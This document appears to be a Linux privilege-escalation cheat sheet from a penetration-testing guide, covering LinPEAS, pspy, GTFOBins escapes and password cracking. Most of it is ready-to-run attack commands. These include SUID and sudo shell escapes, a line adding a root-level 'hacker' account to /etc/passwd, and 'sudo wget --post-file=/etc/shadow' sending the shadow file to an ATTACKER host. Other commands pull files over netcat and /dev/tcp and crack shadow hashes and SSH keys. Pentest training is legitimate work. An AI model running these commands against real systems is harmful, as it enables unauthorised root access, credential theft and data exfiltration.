# 04 — Privilege Escalation: Tools

> Essential tools for finding and exploiting privilege escalation vectors.

---

## 🔴 LinPEAS (Linux Privilege Escalation Awesome Script)

```bash
# Download
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Transfer to target
# Method 1: Python HTTP server
python3 -m http.server 8000  # On attacker
wget http://ATTACKER_IP:8000/linpeas.sh  # On target

# Method 2: curl from GitHub directly
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Execute
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Focused scans
./linpeas.sh -a          # All checks
./linpeas.sh -s          # Stealth mode (no network)
./linpeas.sh -P          # Only password checking
./linpeas.sh -o system_information,users_information  # Specific sections

# Color coding:
# RED/YELLOW → 95% chance of privesc vector
# RED → Must investigate
# CYAN → Active shell user info
# GREEN → Environmental safeguards
# BLUE → Readable interesting files
```

---

## 🔴 LinEnum

```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Execute
chmod +x LinEnum.sh
./LinEnum.sh -t  # Thorough mode
./LinEnum.sh -e /tmp/  # Export writable files info to /tmp/
```

---

## 🔴 pspy (Process Spy)

```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# Execute — watches for new processes (cron jobs, scripts)
chmod +x pspy64
./pspy64

# Watch for patterns:
# UID=0 → Process running as root
# CMD: /bin/sh /opt/backup.sh → Root cron job
# CMD: python3 /root/cleanup.py → Root script

# Use -p flag to include process changes
./pspy64 -pf

# Use -i flag to set scan interval (ms)
./pspy64 -i 100  # Check every 100ms
```

---

## 🔴 GTFOBins Reference Commands

```bash
# Check any binary against GTFOBins:
# https://gtfobins.github.io/

# === SUID EXPLOITATION ===

# bash
bash -p

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'exec "/bin/sh";'

# env
env /bin/sh -p

# awk
awk 'BEGIN {system("/bin/sh")}'

# nmap (old versions)
nmap --interactive
!sh

# less/more
less /etc/passwd
!/bin/sh

# cp (overwrite /etc/passwd)
# Generate password: openssl passwd -1 -salt salt password
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd

# === SUDO EXPLOITATION ===

# sudo vim
sudo vim -c ':!/bin/sh'

# sudo find
sudo find / -exec /bin/sh \; -quit

# sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo less
sudo less /etc/shadow
!sh

# sudo man
sudo man man
!sh

# sudo ftp
sudo ftp
!sh

# sudo env
sudo env /bin/sh

# sudo git
sudo git -p help config
!sh

# sudo tar
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh"

# sudo zip
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"

# sudo ssh
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# sudo wget (file write)
# Set up listener on attacker: nc -lvp 8000 < /etc/shadow (attacker)
sudo wget --post-file=/etc/shadow http://ATTACKER:8000

# sudo tee (file write)
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
```

---

## 🔴 Kernel Exploit Tools

```bash
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Linux Exploit Suggester 2 (Python)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# Compile kernel exploits
# On attacker (with matching architecture):
gcc -o exploit exploit.c
# Transfer compiled binary to target
```

---

## 🔴 File Transfer Methods

```bash
# === ATTACKER TO TARGET ===

# Python HTTP server
python3 -m http.server 8000  # Attacker
wget http://ATTACKER:8000/file  # Target
curl http://ATTACKER:8000/file -o file  # Target

# Netcat
nc -lvp 4444 < file  # Attacker
nc ATTACKER 4444 > file  # Target

# SCP (if SSH available)
scp file user@TARGET:/tmp/  # Push
scp user@TARGET:/etc/passwd ./  # Pull

# Base64 (when no tools available)
base64 file  # On attacker → copy output
echo 'BASE64_OUTPUT' | base64 -d > file  # On target

# PHP download
php -r 'file_put_contents("file", file_get_contents("http://ATTACKER:8000/file"));'

# /dev/tcp (bash only, no additional tools)
bash -c 'cat < /dev/tcp/ATTACKER/8000 > file'
```

---

## 🔴 Password Cracking Tools

```bash
# Crack /etc/shadow hashes
# Extract hash: cat /etc/shadow | grep root
# Format: root:$6$salt$hash:...

# hashcat
hashcat -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt  # SHA-512
hashcat -m 500 shadow_hash.txt /usr/share/wordlists/rockyou.txt   # MD5

# john the ripper
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show unshadowed.txt

# Crack SSH keys
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 📋 Tool Usage Priority

```
1. sudo -l                          → Fastest check (5 sec)
2. find / -perm -4000 2>/dev/null   → SUID check (10 sec)
3. LinPEAS                          → Comprehensive scan (2 min)
4. pspy                             → Cron job discovery (5 min monitoring)
5. Kernel exploit suggester         → Last resort
```
